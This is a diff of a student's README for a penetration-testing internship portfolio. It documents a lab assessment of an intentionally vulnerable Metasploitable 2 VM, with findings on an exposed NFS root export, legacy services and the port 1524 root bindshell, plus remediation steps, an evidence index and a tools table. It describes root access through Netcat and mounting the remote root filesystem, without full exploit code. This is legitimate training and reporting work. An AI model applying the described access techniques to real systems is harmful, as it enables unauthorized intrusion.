+#### Remediation & Hardening Guidance
+1. **Restrict or Remove the Root Export:** Edit `/etc/exports` to remove `/ *` entirely:
+   ```text
+   # SECURE: Restrict exports to specific trusted IP addresses with root_squash
+   /srv/shared 192.168.56.101(rw,sync,root_squash,no_subtree_check)
+   ```
+2. **Reload NFS Exports:**
+   ```bash
+   exportfs -ra
+   ```
+3. **Firewall RPC & NFS Ports:** Restrict TCP/UDP ports 111 and 2049 to administrative subnets only.
+
+---
+
+### OBS-01 (Informational/Attack Surface): Legacy Daemon Banners & Interfaces
+
+- **Observed Services:** vsftpd 2.3.4 (port 21), Apache 2.2.8 (port 80), OpenSSH 4.7p1 (port 22), Tomcat 5.5 (port 8180), Samba 3.X (ports 139/445), MySQL 5.0.51a (port 3306), PostgreSQL 8.3 (port 5432).
+- **Web Applications Exposed:**
+  - `/phpinfo.php`: Discloses full PHP 5.2.4 runtime variables, server environment parameters, and internal directory layout.
+  - `/phpMyAdmin/`: Database administration login page exposed to unauthenticated users.
+  - WebDAV: HTTP methods `OPTIONS` and `PROPFIND` confirmed active on `/dav/`.
+- **Professional Assessment:** Banners provide essential reconnaissance intelligence. However, banners alone do not constitute confirmed vulnerabilities; each service requires isolated proof before assigning exploitable risk ratings.
+- **Remediation:** Remove public `phpinfo.php` scripts, restrict phpMyAdmin to localhost bindings (`127.0.0.1`), disable unused HTTP verbs in Apache, and retire unsupported daemon versions.
+
+---
+
+### OBS-02 (Informational): TWiki Application & Documentation Disclosure
+
+- **Observed Surface:** TWiki enterprise collaboration wiki endpoint identified at `/twiki/bin/view/Main/WebHome`.
+- **Documentation Leakage:** Publicly accessible documentation files and `readme.txt` disclosed `Version: 01 Feb 2003`.
+- **Professional Assessment:** Disclosing software build information facilitates targeted CVE searches by threat actors. While no exploit was launched against TWiki during this non-destructive assessment, the outdated version represents substantial potential vulnerability debt.
+- **Remediation:** Restrict access to internal wikis using role-based access control (RBAC), upgrade TWiki to a modern supported release, and suppress public documentation directories.
+
+---
+
+## 🛠️ Prioritized Remediation & Hardening Action Plan
+
+The following prioritized roadmap provides development and system administration teams with clear, phased remediation steps:
+
+```mermaid
+graph TD
+    P1[Priority 1: Immediate Critical Actions] --> P2[Priority 2: High Severity Actions]
+    P2 --> P3[Priority 3: Medium Network & Service Hardening]
+    P3 --> P4[Priority 4: Follow-Up Re-Scan & Verification]
+
+    P1 -->|1| A1[Kill TCP/1524 Bindshell & Disable inetd entry]
+    P1 -->|2| A2[Remove Wildcard NFS Root Export in /etc/exports]
+
+    P2 -->|3| B1[Enforce NFS root_squash & IP-based CIDR limits]
+    P2 -->|4| B2[Disable anonymous FTP and world-writable SMB shares]
+
+    P3 -->|5| C1[Remove phpinfo.php & restrict phpMyAdmin/Tomcat to localhost]
+    P3 -->|6| C2[Implement host-based iptables firewall policy]
+
+    P4 -->|7| D1[Execute verification Nmap scan & archive before/after proof]
+```
+
+| Priority Phase | Action Item | Target Service / File | Technical Implementation Details | Expected Security Outcome |
+| :---: | :--- | :--- | :--- | :--- |
+| **1 — Immediate** | **Terminate Backdoor Bindshell** | TCP/1524 (`ingreslock`) | `fuser -k 1524/tcp`<br/>Comment out `ingreslock` in `/etc/inetd.conf`<br/>`/etc/init.d/openbsd-inetd restart` | Eliminates unauthenticated root execution vector. |
+| **1 — Immediate** | **Remove Wildcard NFS Root Export** | TCP/2049 (`/etc/exports`) | Delete `/ *` entry from `/etc/exports`<br/>Execute `exportfs -ra` | Prevents unauthorized filesystem mounting and file exfiltration. |
+| **2 — High** | **Harden File Sharing Daemons** | Samba & NFS | Restrict NFS exports to explicit admin IP CIDRs with `root_squash`.<br/>Disable SMBv1; enforce user authentication on all shares. | Enforces least privilege across shared storage. |
+| **3 — Medium** | **Eliminate Web Information Disclosures** | Apache Port 80 & 8180 | Delete `/var/www/phpinfo.php`.<br/>Restrict `/phpMyAdmin` and `/manager/html` using `.htaccess` or localhost binding.<br/>Disable WebDAV `PROPFIND` & `PUT`. | Minimizes reconnaissance intelligence available to attackers. |
+| **3 — Medium** | **Deploy Host-Based Firewall** | Linux Kernel `iptables` | Configure default `DROP` policy on `INPUT` chain; allow only authorized administrative ports from management subnet. | Blocks access to exposed auxiliary daemons (r-services, VNC, X11). |
+| **4 — Verification** | **Post-Remediation Re-Scan** | All 23 Ports | Re-run full Nmap scan (`nmap -sV -p1-65535 192.168.56.103`) to verify closed ports and compare against baseline. | Validates complete remediation efficacy. |
+
+---
+
+## ⚖️ Evidence Integrity & Target IP Demarcation Note
+
+> [!NOTE]
+> **Important Note on Target IP Consistency:**  
+> During the hands-on Phase 2 laboratory engagement, the testing environment was executed across two sequential virtual machine sessions:
+> 1. **Current / Final Validated Target (`192.168.56.103`):**  
+>    The final recreated virtual machine utilized for the primary Nmap service version scan, the verified **TCP/1524 root bindshell** exploit, the ping confirmation, and current NFS export verification.
+> 2. **Historical Baseline Target (`192.168.56.102`):**  
+>    An earlier baseline test run used to capture extensive initial protocol enumeration screenshots (NFS directory listings, SMB share tests, WebDAV verb responses, and service headers).
+> 
+> In accordance with professional penetration testing standards and IqraSec Academy reporting guidelines, historical screenshots are explicitly acknowledged as supporting baseline evidence and are clearly distinguished from the current `192.168.56.103` target validation.
+
+---
+
+## 📁 Repository Hierarchy & Directory Architecture
 
 ```
-Kaustubh Bangar/IqraSec-Internship WAPT/
+IqraSec-Internship WAPT / Phase 2 Task
 │
-├── README.md                                                        <-- Portfolio & Technical Documentation
+├── README.md                                                                <-- Master VAPT Portfolio & Technical Documentation
 │
-└── Kaustubh_Ashish_Bangar_WAPT_Phase-1/
+└── Kaustubh_Ashish_Bangar_WAPT_Phase-2/
+    ├── Vulnerable_Assignment_Penetration_Testing_Report.pdf                 <-- Lab Submission PDF Document
     │
-    ├── 1. Web-Fundamentals/
-    │   ├── Room1_Web_Application_Basics/
-    │   │   ├── Web Application Basics Report.docx                    <-- Executive DOCX Report
-    │   │   ├── Web Application Basics Report.pdf                     <-- Executive PDF Report
-    │   │   └── Screenshots/                                         <-- Proof of Completion
-    │   │       ├── completion.png
-    │   │       ├── important-task1.png
-    │   │       ├── important-task2.png
-    │   │       └── important-task3.png
-    │   │
-    │   └── Room2_HTTP_in _Detail/
-    │       ├── HTTP in Detail Report.docx                            <-- Protocol-Level DOCX Report
-    │       ├── HTTP in Detail Report.pdf                             <-- Protocol-Level PDF Report
-    │       └── Screenshots/                                         <-- Proof of Completion
-    │           ├── completion.png
-    │           ├── important-task1.png ... important-task6.png
+    ├── 01_Lab_Setup/                                                        <-- VirtualBox & Kali Setup Evidence (5 Images)
+    │   ├── Kali Linux Lab.png
+    │   ├── Metasploitable 2 ifconfig.png
+    │   ├── Metasploitable 2 Lab Installed .png
+    │   ├── Metasploitable 2 Lab Setup.png
+    │   └── Metasploitable 2 Network Setting .png
     │
-    ├── 2. Recon-Enumeration/
-    │   ├── Reconnaissance & Enumeration Report.docx                  <-- Consolidated DOCX Report
-    │   ├── Reconnaissance & Enumeration Report.pdf                   <-- Consolidated PDF Report
-    │   ├── Room1_Passive_Reconnaissance/
-    │   │   └── Screenshorts/                                        <-- OSINT, Shodan & DNS Evidence
-    │   │       ├── Completion .png, flag.png, Shodan_io.png...
-    │   ├── Room2_Active_Reconnaissance/
-    │   │   └── Screenshots/                                         <-- Traceroute & Banner Grabbing
-    │   │       ├── Completion .png, Important Task1.png...
-    │   └── Room3_Content_Discovery/
-    │       └── Screenshots/                                         <-- robots.txt, sitemap & Gobuster
-    │           ├── completion.png, important-Tasks.png...
+    ├── 02_Reconnaissance/                                                   <-- Nmap Scans & Discovery (11 Images)
+    │   ├── Check HTTP port 80.png
+    │   ├── gobuster dir.png
+    │   ├── ip addr.png
+    │   ├── login pages.png
+    │   ├── Nmap scan.png
+    │   ├── Nmap_Service_Scan.png
+    │   ├── Nmap_Service_Version_Scan.png
+    │   ├── PHPInfo_Information_Disclosure.png
+    │   ├── PhpMyAdmin_HTML_Source.png
+    │   ├── PhpMyAdmin_Login_Page.png
+    │   └── Target_Ping_Success.png
     │
-    ├── 3. Burp-Suite/
-    │   ├── Burp Suite Repeater Report.docx                           <-- Technical DOCX Report
-    │   ├── Burp Suite Repeater Report.pdf                            <-- Technical PDF Report
-    │   └── Room1_Burp_Suite _Repeater/
-    │       └── Screenshots/                                         <-- Interception, Error & SQLi Flag
-    │           ├── Challenge.png, Flag 1.png, Flag 2.png, Flag 3.png...
+    ├── 03_Enumeration/                                                      <-- Multi-Protocol Deep Enumeration (35 Images)
+    │   ├── AJP_Header_Enumeration.png
+    │   ├── AJP_Service_Enumeration.png
+    │   ├── FTP_Anonymous_Access_Test.png
+    │   ├── FTP_Service_Banner.png
+    │   ├── Gobuster_Directory_Enumeration.png
+    │   ├── NFS_Export_Enumeration 1.png
+    │   ├── NFS_Export_Enumeration.png
+    │   ├── NFS_Hostname_File_Read.png
+    │   ├── NFS_Root_Filesystem_Access.png
+    │   ├── NFS_Root_Filesystem_ReadOnly_Mount.png
+    │   ├── NFS_Service_Version_Enumeration.png
+    │   ├── Port80_Web_Enumeration.png
+    │   ├── Port8180_Tomcat_Enumeration.png
+    │   ├── ProFTPD_2121_Service_Enumeration.png
+    │   ├── ProFTPD_Anonymous_Login_Rejected.png
+    │   ├── SMBv1_Protocol_Verification.png
+    │   ├── SMB_Anonymous_Share_Check.png
+    │   ├── SMB_Enumeration.png
+    │   ├── SMB_IPC_Share_Access_Test.png
+    │   ├── SMB_Opt_Share_Access_Denied.png
+    │   ├── SMB_Print_Share_Access_Denied..png
+    │   ├── SMB_Tmp_Share_Permissions.png
+    │   ├── SSH_Legacy_Algorithm_Check.png
+    │   ├── SSH_Service_Enumeration..png
+    │   ├── Tomcat_55_Default_Page.png
+    │   ├── Tomcat_HTTP_Security_Headers.png
+    │   ├── Tomcat_Management_Authentication_Check.png
+    │   ├── TWiki_Application_Endpoint.png
+    │   ├── TWiki_Application_Enumeration.png
+    │   ├── TWiki_Documentation_Accessibility.png
+    │   ├── TWiki_Version_Identification.png
+    │   ├── WebDAV_GET_Response.png
+    │   ├── WebDAV_OPTIONS_Methods.png
+    │   ├── WebDAV_PROPFIND_Response.png
+    │   └── Web_Application_Path_Enumeration.png
     │
-    └── 4. Common-Web-Vulnerabilities/
-        ├── Room1_IDOR_Santa’s_Little_IDOR/
-        │   ├── IDOR - Santa’s Little IDOR Report.docx               <-- Access Control DOCX Report
-        │   ├── IDOR - Santa’s Little IDOR Report.pdf                <-- Access Control PDF Report
-        │   └── Screenshot/                                          <-- Local Storage & Escalation Evidence
-        │       ├── Complete .png, Complete All Task.png...
-        │
-        └── SQL-Injection/
-            ├── SQL Injection Report.docx                            <-- Advanced 300+ Line DOCX Report
-            ├── SQL Injection Report.pdf                             <-- Advanced 300+ Line PDF Report
-            └── Screenshots/                                         <-- 35 Verification Screenshots
-                ├── LAB 1 to LAB 18 Completed, Time Delay, WAF Solves...
+    └── 04_Vulnerability_Validation/                                         <-- Root Exploitation Proof (1 Image)
+        └── Bindshell_Root_Access_Proof.png
 ```
+
+---
+
+## 📷 Evidence Index & Screenshot Mapping (52 Files)
+
+All practical exercises are backed by high-resolution screenshots systematically archived in the repository:
+
+### 1. Lab Setup Artifacts (`01_Lab_Setup/` — 5 Files)
+- [`Kali Linux Lab.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/01_Lab_Setup/Kali Linux Lab.png>): Verification of Kali Linux host operating environment.
+- [`Metasploitable 2 ifconfig.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/01_Lab_Setup/Metasploitable 2 ifconfig.png>): Target virtual machine network interface configuration.
+- [`Metasploitable 2 Lab Installed .png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/01_Lab_Setup/Metasploitable 2 Lab Installed .png>): Successful installation of the Metasploitable 2 VM in VirtualBox.
+- [`Metasploitable 2 Lab Setup.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/01_Lab_Setup/Metasploitable 2 Lab Setup.png>): Virtual machine system and storage properties.
+- [`Metasploitable 2 Network Setting .png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/01_Lab_Setup/Metasploitable 2 Network Setting .png>): VirtualBox Host-Only adapter configuration (`vboxnet0`).
+
+### 2. Reconnaissance Artifacts (`02_Reconnaissance/` — 11 Files)
+- [`Target_Ping_Success.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/Target_Ping_Success.png>): ICMP echo request confirming active communication with `192.168.56.103`.
+- [`Nmap scan.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/Nmap scan.png>): Initial Nmap discovery scan terminal output.
+- [`Nmap_Service_Scan.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/Nmap_Service_Scan.png>): Comprehensive service scan results across open ports.
+- [`Nmap_Service_Version_Scan.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/Nmap_Service_Version_Scan.png>): Detailed daemon version detection scan on `192.168.56.103`.
+- [`Check HTTP port 80.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/Check HTTP port 80.png>): Web browser baseline connection to target port 80.
+- [`gobuster dir.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/gobuster dir.png>): Directory fuzzing execution against port 80 endpoints.
+- [`ip addr.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/ip addr.png>): Attacker machine IP address validation on the host-only subnet.
+- [`login pages.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/login pages.png>): Exposed authentication portals discovered on the web server.
+- [`PHPInfo_Information_Disclosure.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/PHPInfo_Information_Disclosure.png>): Public `/phpinfo.php` revealing system paths and PHP configuration.
+- [`PhpMyAdmin_Login_Page.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/PhpMyAdmin_Login_Page.png>): phpMyAdmin database administration interface.
+- [`PhpMyAdmin_HTML_Source.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance/PhpMyAdmin_HTML_Source.png>): HTML source code analysis of the phpMyAdmin portal.
+
+### 3. Enumeration Artifacts (`03_Enumeration/` — 35 Files)
+- **NFS Enumeration (6 Files):**
+  - [`NFS_Export_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/NFS_Export_Enumeration.png>): `showmount -e` command revealing wildcard export `/ *`.
+  - [`NFS_Export_Enumeration 1.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/NFS_Export_Enumeration 1.png>): Additional RPC mount point enumeration.
+  - [`NFS_Service_Version_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/NFS_Service_Version_Enumeration.png>): RPC portmapper query isolating NFSv2-4 daemons.
+  - [`NFS_Root_Filesystem_ReadOnly_Mount.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/NFS_Root_Filesystem_ReadOnly_Mount.png>): Mounting the remote root export using `mount -t nfs -o ro`.
+  - [`NFS_Root_Filesystem_Access.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/NFS_Root_Filesystem_Access.png>): Directory traversal of the mounted root filesystem (`/etc`, `/home`, `/root`).
+  - [`NFS_Hostname_File_Read.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/NFS_Hostname_File_Read.png>): Reading `/etc/hostname` to extract target system name.
+- **SMB / Samba Enumeration (7 Files):**
+  - [`SMB_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SMB_Enumeration.png>): Nmap SMB scripts and `smbclient` listing.
+  - [`SMBv1_Protocol_Verification.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SMBv1_Protocol_Verification.png>): Verifying legacy SMBv1 negotiation support.
+  - [`SMB_Anonymous_Share_Check.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SMB_Anonymous_Share_Check.png>): Testing null-session share access.
+  - [`SMB_Tmp_Share_Permissions.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SMB_Tmp_Share_Permissions.png>): Validating read/write permissions on the `/tmp` share.
+  - [`SMB_IPC_Share_Access_Test.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SMB_IPC_Share_Access_Test.png>): Probing access to the `IPC$` inter-process communication share.
+  - [`SMB_Opt_Share_Access_Denied.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SMB_Opt_Share_Access_Denied.png>): Access denial verification on `/opt`.
+  - [`SMB_Print_Share_Access_Denied..png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SMB_Print_Share_Access_Denied..png>): Access denial verification on `/print$`.
+- **FTP & SSH Enumeration (4 Files):**
+  - [`FTP_Service_Banner.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/FTP_Service_Banner.png>): Intercepting vsftpd 2.3.4 banner on port 21.
+  - [`FTP_Anonymous_Access_Test.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/FTP_Anonymous_Access_Test.png>): Testing anonymous login on port 21.
+  - [`ProFTPD_2121_Service_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/ProFTPD_2121_Service_Enumeration.png>): Port 2121 service interrogation.
+  - [`ProFTPD_Anonymous_Login_Rejected.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/ProFTPD_Anonymous_Login_Rejected.png>): Rejected anonymous login verification on ProFTPD.
+  - [`SSH_Service_Enumeration..png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SSH_Service_Enumeration..png>): OpenSSH 4.7p1 service interrogation.
+  - [`SSH_Legacy_Algorithm_Check.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/SSH_Legacy_Algorithm_Check.png>): Deprecated cipher and key-exchange algorithm checks.
+- **Web Applications, WebDAV, Tomcat & TWiki (17 Files):**
+  - [`Port80_Web_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/Port80_Web_Enumeration.png>): Apache 2.2.8 landing page directory traversal.
+  - [`Web_Application_Path_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/Web_Application_Path_Enumeration.png>): URL directory enumeration across port 80.
+  - [`Gobuster_Directory_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/Gobuster_Directory_Enumeration.png>): Gobuster automated scan terminal output.
+  - [`WebDAV_OPTIONS_Methods.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/WebDAV_OPTIONS_Methods.png>): HTTP `OPTIONS` response disclosing WebDAV capabilities.
+  - [`WebDAV_PROPFIND_Response.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/WebDAV_PROPFIND_Response.png>): XML response to WebDAV `PROPFIND` query.
+  - [`WebDAV_GET_Response.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/WebDAV_GET_Response.png>): Standard GET response from WebDAV endpoint.
+  - [`Port8180_Tomcat_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/Port8180_Tomcat_Enumeration.png>): Port 8180 Apache Tomcat 5.5 service banner.
+  - [`Tomcat_55_Default_Page.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/Tomcat_55_Default_Page.png>): Default Tomcat landing page.
+  - [`Tomcat_Management_Authentication_Check.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/Tomcat_Management_Authentication_Check.png>): Tomcat manager authentication challenge.
+  - [`Tomcat_HTTP_Security_Headers.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/Tomcat_HTTP_Security_Headers.png>): Response headers analysis on Tomcat.
+  - [`AJP_Service_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/AJP_Service_Enumeration.png>): Interrogating port 8009 AJP13 connector.
+  - [`AJP_Header_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/AJP_Header_Enumeration.png>): Header analysis of AJP binary messages.
+  - [`TWiki_Application_Endpoint.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/TWiki_Application_Endpoint.png>): TWiki home endpoint `/twiki/bin/view/Main/WebHome`.
+  - [`TWiki_Application_Enumeration.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/TWiki_Application_Enumeration.png>): Navigating TWiki web modules and history.
+  - [`TWiki_Documentation_Accessibility.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/TWiki_Documentation_Accessibility.png>): Publicly accessible TWiki documentation directory.
+  - [`TWiki_Version_Identification.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration/TWiki_Version_Identification.png>): Reading `readme.txt` disclosing `Version: 01 Feb 2003`.
+
+### 4. Vulnerability Validation Artifacts (`04_Vulnerability_Validation/` — 1 File)
+- [`Bindshell_Root_Access_Proof.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/04_Vulnerability_Validation/Bindshell_Root_Access_Proof.png>): **Direct terminal proof** of the Netcat TCP/1524 connection and execution of `id` returning `uid=0(root) gid=0(root) groups=0(root)` on target `192.168.56.103`.
+
+---
+
+## 📑 Technical Reports & Documentation
+
+The complete findings, risk analyses, and remediation roadmaps are documented across formal executive reports:
+
+1. **Lab Assignment Documentation:**
+   - [Vulnerable_Assignment_Penetration_Testing_Report.pdf](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/Vulnerable_Assignment_Penetration_Testing_Report.pdf>)
+   - *Scope:* Complete lab documentation submission for IqraSec Academy evaluation.
 
 ---
 
 ## 🧰 Security Tools & Frameworks Utilized
 
-| Category | Tools / Utilities | Practical Purpose |
+| Tool / Technology | Version / Platform | Operational Function & Engagement Purpose |
 | :--- | :--- | :--- |
-| **Traffic Interception & Analysis** | Burp Suite Community v2026.2.3, Burp Proxy, Burp Repeater | Raw HTTP request interception, parameter tampering, header injection, response analysis |
-| **Network & Service Probing** | Telnet, Netcat (`nc`), Ping, Traceroute | Active TCP banner grabbing (Apache 2.4.61), multi-hop network path diagnostics |
-| **DNS & OSINT Intelligence** | `dig`, `nslookup`, `whois`, RDAP, Shodan.io, crt.sh | DNS TXT token discovery, domain ownership, global server footprinting, certificate transparency |
-| **Directory & Content Discovery** | Gobuster, cURL (`curl -v`), Browser DevTools | Subdomain and path fuzzing, HTTP verb tampering, custom response header extraction |
-| **Platform Laboratories** | TryHackMe AttackBox, PortSwigger Web Security Academy | Controlled vulnerability exploitation environments (Apprentice to Practitioner) |
-| **Reporting & Documentation** | Microsoft Word, Adobe PDF, Markdown | Professional executive reporting, technical documentation, diagramming |
-
----
-
-## 🏆 Key Takeaways & Professional Competencies
-
-1. **Protocol Rigor Over Blind Scanning:** Automated scanners generate high false-positive rates and miss nuanced access control flaws. In-depth understanding of HTTP headers, status codes, and database parsing mechanics enables targeted, surgical exploitation.
-2. **The Primacy of Authorization:** Authentication verifies *identity*, but authorization enforces *permissions*. Access control flaws like IDOR represent critical business logic failures that cannot be patched with perimeter obfuscation (Base64/hashes).
-3. **Prepared Statements are Inviolable:** Input blacklists and WAF signatures can almost always be bypassed with alternate character encodings (e.g., XML entities). Only parameterization provides mathematical protection against SQL injection.
-4. **Actionable Executive Reporting:** High-quality penetration testing is measured not only by exploits found, but by the clarity, reproducibility, and defensive remediation guidance communicated to development teams.
+| **Oracle VirtualBox** | Version 7.x | Hypervisor establishing isolated host-only network (`192.168.56.0/24`) preventing external packet egress. |
+| **Kali Linux** | 2026.x 64-bit | Primary penetration testing operating system and security analysis suite. |
+| **Nmap (Network Mapper)** | Version 7.9x | Full TCP SYN scanning, service/version detection (`-sV`), OS fingerprinting (`-O`), and script engine checks (`-sC`). |
+| **Netcat (`nc`)** | Traditional BSD | Connecting to raw TCP socket on port 1524, validating unauthenticated root shell execution and interactive CLI. |
+| **NFS Client (`mount`/`showmount`)**| Linux NFSv3 Utils | Interrogating RPC portmapper on port 2049, discovering wildcard `/ *` export, and executing client-side read-only mount. |
+| **Samba Client (`smbclient`)** | Version 4.x | Probing SMBv1 negotiation on ports 139/445, querying share permissions, and testing null-session access. |
+| **Gobuster** | Version 3.x | Automated high-speed directory and endpoint fuzzing against port 80 web applications. |
+| **cURL (`curl -v`)** | CLI HTTP Client | Inspecting raw HTTP response headers, testing WebDAV verbs (`OPTIONS`, `PROPFIND`), and analyzing server banners. |
+| **Chromium Developer Tools** | Built-in Browser | Inspecting HTML source code, form elements, and authentication parameters on phpMyAdmin and Tomcat. |
 
 ---
 
 ## ⚖️ Legal & Ethical Disclaimer
 
 > [!IMPORTANT]
-> The security assessments, proof-of-concept exploits, and vulnerability analyses documented in this repository were executed strictly within **isolated, authorized laboratory environments** provided by **TryHackMe**, **PortSwigger Web Security Academy**, and **IqraSec Academy**.  
-> This documentation is maintained exclusively for educational purposes, academic demonstration, and professional portfolio verification. Unauthorized access, scanning, or exploitation against computer systems without prior explicit written authorization from the system owners is illegal under applicable cybercrime legislation (e.g., the Computer Fraud and Abuse Act, UK Computer Misuse Act, and the Indian Information Technology Act, 2000).
+> The vulnerability assessments, network scans, and exploitation proofs documented in this repository were conducted strictly within an **isolated, private VirtualBox virtual machine environment** against an intentionally vulnerable demonstration system (**Metasploitable 2**).  
+> All activities strictly adhered to the authorized scope defined by the **IqraSec Academy Cybersecurity Internship Program**. No external, production, or unapproved network assets were targeted. Unauthorized scanning, penetration testing, or exploitation of computer systems without explicit written permission from the system owner is illegal under cybercrime statutes including the US Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the Indian Information Technology Act, 2000.
 
 ---
 
 <div align="center">
 
-**IqraSec Academy — Web Application Penetration Testing (WAPT) Internship**  
-*Documented by Kaustubh Ashish Bangar*
+**IqraSec Academy — Cybersecurity Internship Program**  
+*Phase 2: Vulnerability Assessment & Penetration Testing (VAPT) Portfolio*  
+**Documented by Kaustubh Ashish Bangar**
 
-⭐ *If you find this repository insightful for WAPT / VAPT learning, consider giving it a star!* ⭐
+⭐ *If you find this repository valuable for your penetration testing, network security, or VAPT learning journey, please consider starring it!* ⭐
 
 </div>
